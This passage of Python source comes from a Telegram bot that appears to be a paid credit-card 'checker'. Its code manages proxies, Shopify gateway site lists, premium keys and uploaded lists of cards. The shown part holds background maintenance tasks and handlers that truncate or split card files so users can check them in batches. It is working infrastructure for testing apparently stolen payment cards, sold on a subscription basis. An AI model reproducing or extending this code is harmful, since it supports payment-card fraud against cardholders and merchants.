                await safe_send(ADMIN_ID[0], premium_emoji(f"🧹 <b>Aᴜᴛᴏ Sɪᴛᴇ Cʟᴇᴀɴᴜᴘ</b>\n\n✅ Aʟʟ {len(alive_sites)} sɪᴛᴇs ᴀʟɪᴠᴇ!"), parse_mode='html')
        except Exception as e:
            print(f"Auto-clean sites error: {e}")
        await asyncio.sleep(12 * 60 * 60)


async def auto_key_expiry_warnings():
    """Runs every 6 hours. Warns users whose premium expires within 24h."""
    await asyncio.sleep(90)
    while True:
        try:
            expiring = await db_manager.get_expiring_premiums(hours=24)
            for user in expiring:
                uid = user['user_id']
                if uid not in expiry_warned_users:
                    expiry_warned_users.add(uid)
                    try:
                        exp = datetime.fromisoformat(user['expiry'])
                        remaining = exp - datetime.now()
                        hours_left = int(remaining.total_seconds() // 3600)
                        await safe_send(uid, premium_emoji(f"⚠️ <b>Pʀᴇᴍɪᴜᴍ Exᴘɪʀɪɴɢ Sᴏᴏɴ!</b>\n\n⏰ Yᴏᴜʀ ᴘʀᴇᴍɪᴜᴍ ᴇxᴘɪʀᴇs ɪɴ <code>{hours_left}</code> ʜᴏᴜʀs.\n\n🔑 Usᴇ <code>/redeem KEY</code> ᴛᴏ ʀᴇɴᴇᴡ!"), parse_mode='html')
                    except:
                        pass
        except Exception as e:
            print(f"Key expiry warning error: {e}")
        await asyncio.sleep(6 * 60 * 60)


async def auto_health_check():
    while True:
        try:
            active = []
            timeout = aiohttp.ClientTimeout(total=10)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                for api in API_SERVERS:
                    try:
                        async with session.get(f"{api}/health") as resp:
                            if resp.status == 200:
                                active.append(api)
                    except Exception:
                        pass
            if active:
                global ACTIVE_API_SERVERS
                ACTIVE_API_SERVERS.clear()
                ACTIVE_API_SERVERS.extend(active)
        except Exception:
            pass
        await asyncio.sleep(60)


# ---------------------------------------------------------------------------
# Auto-cleanup old .txt files from working directory
# ---------------------------------------------------------------------------
PROTECTED_FILES = {
    'proxy.txt', 'sites.txt', 'bot.py', 'bot.db', 'shopii.db',
    'admins.json', 'premium_users.txt', 'all_users.txt',
    'db_manager.py', 'delete_keys.py', 'downgrade.py',
    'sites_price.json', 'premium_expiry.json', 'keys.json',
    'checker_bot.session', 'checker_bot.session-journal',
}

async def auto_cleanup_files():
    """Delete .txt files older than 1 hour from working directory every 30 minutes."""
    while True:
        try:
            await asyncio.sleep(1800)  # Run every 30 minutes
            now = time.time()
            max_age = 3600  # 1 hour in seconds
            cleaned = 0
            for f in os.listdir('.'):
                if f in PROTECTED_FILES:
                    continue
                if not f.endswith('.txt'):
                    continue
                # Skip files that look essential
                if f.startswith(('proxy', 'sites', 'premium', 'admin', 'keys')):
                    continue
                try:
                    file_age = now - os.path.getmtime(f)
                    if file_age > max_age and os.path.isfile(f):
                        os.remove(f)
                        cleaned += 1
                except Exception:
                    pass
            if cleaned > 0:
                print(f"🧹 Auto-cleanup: deleted {cleaned} old .txt files")
        except Exception:
            pass


@bot.on(events.CallbackQuery(pattern=rb"chk_trunc:(\d+):(\d+)"))
async def chk_trunc_callback(event):
    match = event.pattern_match
    max_cards = int(match.group(1).decode())
    user_id = int(match.group(2).decode())

    if event.sender_id != user_id:
        await event.answer("❌ Nᴏᴛ ʏᴏᴜʀ ғɪʟᴇ!", alert=True)
        return

    data_key = f"{user_id}_overlimit"
    if data_key not in TEMP_FILE_DATA:
        await safe_edit(event, premium_emoji("❌ Fɪʟᴇ ɴᴏᴛ ғᴏᴜɴᴅ! Pʟᴇᴀsᴇ ᴜᴘʟᴏᴀᴅ ᴀɢᴀɪɴ."), parse_mode='html')
        return

    file_data = TEMP_FILE_DATA.pop(data_key)
    valid_cards = file_data['cards'][:max_cards]
    file_path = file_data['file_path']

    TEMP_FILE_DATA[user_id] = {'cards': valid_cards, 'file_path': file_path}
    
    filters = await load_price_filters()
    gateway_filters = filters.get('shopify_global', DEFAULT_FILTERS)
    buttons = []
    row = []
    for i, f in enumerate(gateway_filters):
        row.append(Button.inline(f["name"], f"price_fltr:{i}:{user_id}".encode()))
        if len(row) == 2:
            buttons.append(row)
            row = []
    if row:
        buttons.append(row)
    buttons.append([Button.inline("  Cᴀɴᴄᴇʟ", b"cancel_filter")])
    await safe_edit(event, 
        premium_emoji(
            f"📁 Fɪʟᴇ ᴛʀᴜɴᴄᴀᴛᴇᴅ: <b>{len(valid_cards):,}</b> ᴄᴀʀᴅs (Lɪᴍɪᴛ ᴡᴀs {max_cards:,})\n\n💰 Sᴇʟᴇᴄᴛ ᴀ ᴘʀɪᴄᴇ ғɪʟᴛᴇʀ:"),
        buttons=buttons,
        parse_mode='html'
    )


@bot.on(events.CallbackQuery(pattern=rb"chk_split:(\d+):(\d+)"))
async def chk_split_callback(event):
    match = event.pattern_match
    chunk_size = int(match.group(1).decode())
    user_id = int(match.group(2).decode())

    if event.sender_id != user_id:
        await event.answer("❌ Nᴏᴛ ʏᴏᴜʀ ғɪʟᴇ!", alert=True)
        return

    data_key = f"{user_id}_overlimit"
    if data_key not in TEMP_FILE_DATA:
        await safe_edit(event, premium_emoji("❌ Fɪʟᴇ ɴᴏᴛ ғᴏᴜɴᴅ! Pʟᴇᴀsᴇ ᴜᴘʟᴏᴀᴅ ᴀɢᴀɪɴ."), parse_mode='html')
        return

    file_data = TEMP_FILE_DATA.pop(data_key)
    cards = file_data['cards']
    file_path = file_data['file_path']

    if os.path.exists(file_path):
        try:
            os.remove(file_path)
        except:
            pass

    await safe_edit(event, premium_emoji(f"🔄 Sᴘʟɪᴛᴛɪɴɢ {len(cards)} ᴄᴀʀᴅs ɪɴᴛᴏ {chunk_size} ᴄᴀʀᴅs ᴘᴇʀ ғɪʟᴇ..."), parse_mode='html')

    chunks = [cards[i:i + chunk_size] for i in range(0, len(cards), chunk_size)]

    for i, chunk in enumerate(chunks, 1):
        filename = f"cards_part_{i}_of_{len(chunks)}.txt"
        async with aiofiles.open(filename, 'w') as f:
            for card in chunk:
                await f.write(f"{card}\n")

        await bot.send_file(
            user_id,
            filename,
            caption=premium_emoji(f" Pᴀʀᴛ {i}/{len(chunks)}\n Cᴀʀᴅs: {len(chunk)}")
        )

        try:
            os.remove(filename)
        except:
            pass

        await asyncio.sleep(2)

    await safe_edit(event, premium_emoji(f"✅ Sᴘʟɪᴛ ᴄᴏᴍᴘʟᴇᴛᴇ!\n\n📊 Tᴏᴛᴀʟ: {len(cards)} ᴄᴀʀᴅs\n📁 Fɪʟᴇs: {len(chunks)}\n📄 Cᴀʀᴅs ᴘᴇʀ ғɪʟᴇ: {chunk_size}\n\n💡 <i>Yᴏᴜ ᴄᴀɴ ɴᴏᴡ ᴜᴘʟᴏᴀᴅ ᴛʜᴇsᴇ sᴘʟɪᴛ ғɪʟᴇs ᴏɴᴇ ʙʏ ᴏɴᴇ ᴛᴏ ᴄʜᴇᴄᴋ ᴛʜᴇᴍ.</i>"), parse_mode='html')


@bot.on(events.CallbackQuery(pattern=rb"chk_overlimit_cancel:(\d+)"))
async def chk_overlimit_cancel_callback(event):
    match = event.pattern_match
    user_id = int(match.group(1).decode())

    if event.sender_id != user_id:
        await event.answer("❌ Nᴏᴛ ʏᴏᴜʀ ғɪʟᴇ!", alert=True)
        return

    data_key = f"{user_id}_overlimit"
    if data_key in TEMP_FILE_DATA:
        file_data = TEMP_FILE_DATA.pop(data_key)
        if os.path.exists(file_data['file_path']):
            try:
                os.remove(file_data['file_path'])
            except:
                pass

    await safe_edit(event, premium_emoji("❌ Cᴀɴᴄᴇʟʟᴇᴅ."), parse_mode='html')
    await event.answer("✅ Cᴀɴᴄᴇʟʟᴇᴅ", alert=True)

if __name__ == '__main__':
    print("✅ Bᴏᴛ sᴛᴀʀᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!")
    bot.loop.create_task(auto_backup())
    bot.loop.create_task(auto_expire_premiums())
    bot.loop.create_task(admin_health_alerts())
    bot.loop.create_task(auto_clean_sites())
    bot.loop.create_task(auto_key_expiry_warnings())
    bot.loop.create_task(auto_health_check())
    bot.loop.create_task(auto_cleanup_files())

    while True:
        try:
            bot.run_until_disconnected()
        except Exception as e:
            print(f"Telethon loop crashed: {e}")
            try:
                bot.disconnect()
            except:
                pass
            import time
            time.sleep(5)
            try:
                bot.start(bot_token=BOT_TOKEN)
            except Exception as e2:
                print(f"Could not restart bot loop: {e2}")
                time.sleep(10)

